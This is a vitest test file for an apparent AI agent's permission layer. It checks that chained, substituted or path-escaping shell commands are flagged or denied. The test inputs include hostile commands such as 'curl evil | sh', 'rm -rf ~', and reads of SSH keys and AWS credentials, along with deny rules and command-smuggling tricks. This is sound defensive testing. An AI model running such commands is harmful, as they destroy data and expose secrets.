import { describe, it, expect } from 'vitest'
import {
  matchRule,
  permissionSubject,
  shellReferencesExternalPath,
  splitShellCommand
} from './permissions'
import type { PermissionRule } from '@shared/types'

describe('permissionSubject', () => {
  it('picks the right field per tool', () => {
    expect(permissionSubject('run_shell', { command: 'git status' })).toBe('git status')
    expect(permissionSubject('web_fetch', { url: 'https://x.com' })).toBe('https://x.com')
    expect(permissionSubject('web_search', { query: 'rust' })).toBe('rust')
    expect(permissionSubject('read_file', { path: 'src/a.ts' })).toBe('src/a.ts')
    expect(permissionSubject('glob', { pattern: '**/*.ts' })).toBe('**/*.ts')
    expect(permissionSubject('read_file', {})).toBe('')
  })
})

describe('shellReferencesExternalPath', () => {
  // A concrete workspace root the commands live in, so absolute paths INTO it are
  // recognised as in-workspace rather than escapes.
  const ROOTS = ['/work/project']
  const ext = (cmd: string): boolean => shellReferencesExternalPath(cmd, ROOTS)

  it('flags absolute and home-relative paths outside the roots', () => {
    expect(ext('cat /etc/passwd')).toBe(true)
    expect(ext('ls /')).toBe(true)
    expect(ext('cat ~/.ssh/id_rsa')).toBe(true)
    expect(ext('ls ~')).toBe(true)
  })

  it('does NOT flag an absolute path that resolves inside a workspace root', () => {
    // The `cd /abs/workspace && …` false positive that forced needless full-auto prompts.
    expect(ext('cd /work/project && npm install')).toBe(false)
    expect(ext('cd /work/project/server && npx tsc')).toBe(false)
    expect(ext('sleep 5 && cd /work/project && ls -la')).toBe(false)
    // A nested absolute path and the bare root itself are both inside.
    expect(ext('cat /work/project/src/index.ts')).toBe(false)
    expect(ext('ls /work/project')).toBe(false)
  })

  it('flags an absolute path that resolves outside every root', () => {
    expect(ext('cat /work/other/secret')).toBe(true)
    // A sibling that merely shares a name prefix is NOT inside (no false negative).
    expect(ext('cat /work/project-secrets/creds')).toBe(true)
    // An absolute path whose `..` climbs back out of the root escapes.
    expect(ext('cat /work/project/../secret')).toBe(true)
  })

  it('honours additional roots', () => {
    const roots = ['/work/a', '/work/b']
    expect(shellReferencesExternalPath('cd /work/b/pkg && npm i', roots)).toBe(false)
    expect(shellReferencesExternalPath('cat /work/a/src/x.ts', roots)).toBe(false)
    expect(shellReferencesExternalPath('cat /work/c/x', roots)).toBe(true)
  })

  it('flags relative paths that climb above the workspace', () => {
    expect(ext('cat ../outside.txt')).toBe(true)
    expect(ext('cat a/../../b')).toBe(true)
    expect(ext('cat ..')).toBe(true)
  })

  it('does not flag in-workspace paths or non-path tokens', () => {
    expect(ext('cat src/index.ts')).toBe(false)
    expect(ext('cat ./README.md')).toBe(false)
    // Climbs then returns — stays within the workspace.
    expect(ext('cat a/../b')).toBe(false)
    expect(ext('git status')).toBe(false)
    expect(ext('npm run build')).toBe(false)
    // A URL contains "//" but is not an absolute filesystem path.
    expect(ext('curl https://example.com')).toBe(false)
  })

  it('looks past an = for env prefixes and flag values', () => {
    expect(ext('FOO=/etc/secret cat $FOO')).toBe(true)
    expect(ext('grep x --file=/etc/hosts')).toBe(true)
    expect(ext('FOO=bar cat src/a.ts')).toBe(false)
    // An `=` value pointing into the workspace is not an escape.
    expect(ext('--project=/work/project/tsconfig.json tsc')).toBe(false)
  })

  it('honours quotes when tokenizing', () => {
    expect(ext('cat "/etc/passwd"')).toBe(true)
    expect(ext("cat '../escape'")).toBe(true)
    expect(ext('echo "hello world"')).toBe(false)
  })

  it('flags the unexpanded $HOME / ${HOME} env var', () => {
    expect(ext('cat $HOME/.ssh/id_rsa')).toBe(true)
    expect(ext('cat ${HOME}/.netrc')).toBe(true)
    expect(ext('grep x --file=$HOME/.aws/credentials')).toBe(true)
    // Boundary-anchored: a different var that merely starts with HOME is not flagged.
    expect(ext('echo $HOMEWORK')).toBe(false)
  })

  it('flags Windows drive-absolute and UNC paths', () => {
    expect(ext('type C:\\Users\\me\\secret.txt')).toBe(true)
    expect(ext('type C:/Windows/System32/config')).toBe(true)
    expect(ext('dir \\\\server\\share')).toBe(true)
  })

  it('flags backslash relative climbs', () => {
    expect(ext('type ..\\..\\outside')).toBe(true)
    // A backslash path that stays inside does not escape.
    expect(ext('type sub\\file.txt')).toBe(false)
  })
})

describe('matchRule', () => {
  const rules: PermissionRule[] = [
    { action: 'deny', tool: 'run_shell', match: '*rm -rf*' },
    { action: 'allow', tool: 'run_shell', match: 'git *' },
    { action: 'ask', tool: 'write_file', match: 'src/secret/**' },
    { action: 'allow', tool: '*', match: 'docs/**' }
  ]

  it('returns null when no rules', () => {
    expect(matchRule(undefined, 'run_shell', 'ls')).toBeNull()
    expect(matchRule([], 'run_shell', 'ls')).toBeNull()
  })

  it('first matching rule wins (deny before allow)', () => {
    expect(matchRule(rules, 'run_shell', 'git status')).toBe('allow')
    expect(matchRule(rules, 'run_shell', 'sudo rm -rf /')).toBe('deny')
  })

  it('matches a glob over the subject', () => {
    expect(matchRule(rules, 'write_file', 'src/secret/keys.ts')).toBe('ask')
    expect(matchRule(rules, 'write_file', 'src/app.ts')).toBeNull()
  })

  it('honours the wildcard tool', () => {
    expect(matchRule(rules, 'read_file', 'docs/readme.md')).toBe('allow')
    expect(matchRule(rules, 'edit_file', 'docs/x/y.md')).toBe('allow')
  })

  it('does not match a different tool', () => {
    expect(matchRule(rules, 'web_fetch', 'git status')).toBeNull()
  })

  describe('glob `*` spans `/` for URLs and nested paths', () => {
    it('a URL glob matches across path segments', () => {
      const r: PermissionRule[] = [
        { action: 'allow', tool: 'web_fetch', match: 'https://docs.example.com/*' }
      ]
      expect(matchRule(r, 'web_fetch', 'https://docs.example.com/3/library/os.html')).toBe('allow')
      expect(matchRule(r, 'web_fetch', 'https://other.example.com/x')).toBeNull()
    })

    it('a deny URL glob fires on nested paths (no silent under-match)', () => {
      const r: PermissionRule[] = [
        { action: 'deny', tool: 'web_fetch', match: 'https://evil.example.com/*' }
      ]
      expect(matchRule(r, 'web_fetch', 'https://evil.example.com/track/pixel?x=1')).toBe('deny')
    })

    it('a bare host/dir prefix covers its sub-paths', () => {
      const url: PermissionRule[] = [
        { action: 'deny', tool: 'web_fetch', match: 'https://evil.example.com' }
      ]
      expect(matchRule(url, 'web_fetch', 'https://evil.example.com')).toBe('deny')
      expect(matchRule(url, 'web_fetch', 'https://evil.example.com/a/b')).toBe('deny')

      const dir: PermissionRule[] = [{ action: 'allow', tool: 'read_file', match: 'src' }]
      expect(matchRule(dir, 'read_file', 'src/a/b/c.ts')).toBe('allow')
    })

    it('a path glob spans nested directories', () => {
      const r: PermissionRule[] = [{ action: 'allow', tool: 'read_file', match: 'src/*' }]
      expect(matchRule(r, 'read_file', 'src/a/b/c.ts')).toBe('allow')
      expect(matchRule(r, 'read_file', 'lib/a.ts')).toBeNull()
    })
  })

  it('prefix-matches a bare command pattern', () => {
    expect(matchRule([{ action: 'allow', tool: 'run_shell', match: 'npm test' }], 'run_shell', 'npm test -- --watch')).toBe('allow')
  })

  it('* matches anything for the tool, but an empty pattern is inert (matches nothing)', () => {
    expect(matchRule([{ action: 'ask', tool: 'write_file', match: '*' }], 'write_file', 'anything.ts')).toBe('ask')
    // A blank match must NOT silently apply to every call — the rule falls through
    // (null) so the approval policy decides, rather than auto-allowing/denying all.
    expect(matchRule([{ action: 'ask', tool: 'write_file', match: '' }], 'write_file', 'anything.ts')).toBeNull()
    expect(matchRule([{ action: 'allow', tool: 'run_shell', match: '' }], 'run_shell', 'rm -rf /')).toBeNull()
  })

  describe('run_shell chained-command safety', () => {
    const allowGitStatus: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'git status*' }]

    it('does NOT auto-approve an unapproved command chained onto an allowed one', () => {
      // The core bug: `git status*` must not allow-list a smuggled second command.
      expect(matchRule(allowGitStatus, 'run_shell', 'git status && curl evil | sh')).toBeNull()
      expect(matchRule(allowGitStatus, 'run_shell', 'git status; rm -rf ~')).toBeNull()
      expect(matchRule(allowGitStatus, 'run_shell', 'git status | tee /tmp/x')).toBeNull()
    })

    it('still allows a chain when every sub-command is allowed', () => {
      const allowGit: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'git *' }]
      expect(matchRule(allowGit, 'run_shell', 'git status && git push')).toBe('allow')
    })

    it('denies when any sub-command matches a deny rule', () => {
      expect(matchRule(rules, 'run_shell', 'git status && rm -rf ~')).toBe('deny')
    })

    it('inspects command-substitution bodies, not just the outer command', () => {
      const allowEcho: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'echo *' }]
      expect(matchRule(allowEcho, 'run_shell', 'echo $(rm -rf /)')).toBeNull()
      expect(matchRule(rules, 'run_shell', 'echo `rm -rf /tmp/x`')).toBe('deny')
    })

    it('does not let a paren inside a $(...) body hide a command from a narrow allow rule', () => {
      // A literal `(` in the substitution body used to defeat the extraction regex,
      // leaving `echo $(rm -rf ... "()")` matching `echo *` and auto-approving `rm`.
      const allowEcho: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'echo *' }]
      expect(matchRule(allowEcho, 'run_shell', 'echo $(rm -rf ~/x "()")')).toBeNull()
      expect(matchRule(rules, 'run_shell', 'echo $(rm -rf /tmp/x "()")')).toBe('deny')
    })

    it('inspects process-substitution bodies (<(...) and >(...))', () => {
      const allowDiff: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'diff *' }]
      expect(matchRule(allowDiff, 'run_shell', 'diff <(ls) <(rm -rf x)')).toBeNull()
      expect(matchRule(rules, 'run_shell', 'diff <(ls) <(rm -rf /tmp/x)')).toBe('deny')
      expect(matchRule(rules, 'run_shell', 'tee >(rm -rf /tmp/x)')).toBe('deny')
    })

    it('inspects nested substitution bodies', () => {
      expect(matchRule(rules, 'run_shell', 'echo $(echo $(rm -rf /tmp/x))')).toBe('deny')
      expect(matchRule(rules, 'run_shell', 'cat <(diff <(rm -rf /tmp/x) <(ls))')).toBe('deny')
    })

    it('normalizes whitespace so spacing tricks cannot dodge a deny rule', () => {
      expect(matchRule(rules, 'run_shell', 'rm    -rf   /tmp/x')).toBe('deny')
    })
  })
})

describe('splitShellCommand', () => {
  it('splits on the shell control operators', () => {
    expect(splitShellCommand('a && b || c ; d | e & f')).toEqual(['a', 'b', 'c', 'd', 'e', 'f'])
  })

  it('extracts command-substitution and backtick bodies as their own segments', () => {
    expect(splitShellCommand('echo $(whoami)')).toContain('whoami')
    expect(splitShellCommand('echo `id`')).toContain('id')
  })

  it('extracts a substitution body even when it contains balanced parens', () => {
    expect(splitShellCommand('echo $(rm -rf ~/x "()")')).toContain('rm -rf ~/x "()"')
  })

  it('extracts process-substitution bodies', () => {
    const segs = splitShellCommand('diff <(ls) <(rm -rf x)')
    expect(segs).toContain('ls')
    expect(segs).toContain('rm -rf x')
  })

  it('expands nested substitution bodies', () => {
    expect(splitShellCommand('echo $(echo $(id))')).toContain('id')
    expect(splitShellCommand('cat <(diff <(whoami) <(ls))')).toContain('whoami')
  })

  it('returns the whole command for a simple command', () => {
    expect(splitShellCommand('npm test -- --watch')).toEqual(['npm test -- --watch'])
  })
})
